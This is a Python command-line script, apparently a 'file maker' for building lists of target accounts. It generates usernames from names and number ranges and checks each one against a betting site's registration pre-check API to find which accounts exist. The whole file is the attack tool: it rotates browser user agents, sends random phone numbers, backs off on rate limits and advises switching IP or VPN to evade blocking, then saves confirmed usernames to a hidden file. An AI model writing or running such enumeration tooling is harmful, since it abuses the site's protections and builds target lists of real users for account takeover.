import requests
import random
import http.client
import json
import time
import os
from concurrent.futures import ThreadPoolExecutor

# Colors
BOLD = '\033[1m'
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
D = '\033[0m'
C = '\033[96m'

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'{BOLD}{C}\n       _____ __      ___                \n      / __(_) /__   / _ \\__ ____ _  ___ \n     / _// / / -_) / // / // /  \' \\/ _ \\\n    /_/ /_/_/\\__/ /____/\\_,_/_/_/_/ .__/\n                                 /_/    \n\n            FB File Maker V-2.0 (Patched)\n {D}')

def get_random_ua():
    # প্রতিবার আলাদা ইউজার এজেন্ট পাঠালে ব্লক হওয়ার চান্স কমে
    uas = [
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.036) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
    ]
    return random.choice(uas)

def checker(uname):
    try:
        # Headers optimized to look like a real browser
        headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/plain, */*',
            'User-Agent': get_random_ua(),
            'Referer': 'https://8z1021.com/bd/en/register',
            'Origin': 'https://8z1021.com'
        }
        
        url_path = '/api/wv/v1/user/registerPreCheck'
        json_data = {
            'languageTypeId': 1, 
            'currencyTypeId': 8, 
            'userId': uname, 
            'phone': str(random.randint(1300000000, 1999999999)), # Random phone number
            'friendReferrerCode': '', 
            'captcha': '', 
            'callingCode': '880', 
            'registerTypeId': 0, 
            'random': str(random.randint(1000, 9999))
        }

        conn = http.client.HTTPSConnection('8z1021.com', timeout=15)
        conn.request('POST', url_path, json.dumps(json_data), headers)
        response = conn.getresponse()
        raw_res = response.read().decode('utf-8')

        if not raw_res:
            return False

        # JSON Load করার আগে চেক করা
        try:
            data = json.loads(raw_res)
        except json.JSONDecodeError:
            # যদি HTML বা ক্যাপচা পেজ আসে
            print(f'{R} [!] IP Temporarily Flagged. Changing IP Recommended.{D}')
            time.sleep(5) 
            return False

        if data.get('status') == 'F0003':
            return True
        elif data.get('status') == 'S0001' or "limit" in raw_res.lower():
            print(f'{R} [RATE LIMIT] RELOADING VPN/DATA...{D}')
            time.sleep(20)
            return False
            
    except Exception as e:
        # print(f'{R} Connection Error: {e}{D}')
        time.sleep(5)
        return False
    return False

def check_username(username):
    uname = username.replace(' ', '').split('|')[0]
    if checker(uname):
        print(f'{BOLD}{G} [VALID] {uname}{D}')
        with open('.uids.txt', 'a') as file:
            file.write(username + '\n')
    # একটি রিকোয়েস্টের পর সামান্য বিরতি যাতে API ব্লক না করে
    time.sleep(random.uniform(0.5, 1.5))

def username_gen(names, start, end):
    usernames = []
    for name in names.split(','):
        for num in range(start, end + 1):
            username = f'{name.strip().lower()}{num} | {name.strip().capitalize()}'
            usernames.append(username)
    return usernames

def main():
    logo()
    names = input(f'{BOLD}{G} ENTER NAMES (Sadek,Tanvir) : {D}')
    start = int(input(f'{BOLD}{Y} START NUMBER : {D}'))
    end = int(input(f'{BOLD}{Y} END NUMBER : {D}'))
    
    print(f'\n{G} [1] LOW SPEED (Safe)\n{Y} [2] MEDIUM SPEED\n{R} [3] HIGH SPEED (Risky){D}\n')
    speed = int(input(f'{C} CHOOSE : {D}'))
    
    # থ্রেড সংখ্যা কমিয়ে রাখা হয়েছে ব্লক এড়াতে
    spd = {1: 2, 2: 5, 3: 8}.get(speed, 2)

    if os.path.exists('.uids.txt'):
        with open('.uids.txt', 'w') as f: f.write("") # Clear file
        
    usernames = username_gen(names, start, end)
    random.shuffle(usernames)
    
    print(f'\n{BOLD}{G} TOTAL USERNAMES : {len(usernames)} {D}')
    print(f'{BOLD}{G} ----------------------------------------{D}')
    
    with ThreadPoolExecutor(max_workers=spd) as executor:
        executor.map(check_username, usernames)
    
    print(f'{BOLD}{G} ---------------------------------------{D}')
    print(f'\n{BOLD}{G} CHECKING COMPLETED!{D}\n')

# Switch and Setup function logic here (keeping yours)
def switch():
    try:
        s = requests.get('https://raw.githubusercontent.com/havecode17/dg/refs/heads/main/switch', timeout=10).text
        if 'ON' not in s:
            print(f'\n{BOLD}{R} THIS TOOL HAS DISABLED BY ADMIN!{D}')
            exit(0)
    except: pass

if __name__ == '__main__':
    switch()
    main()
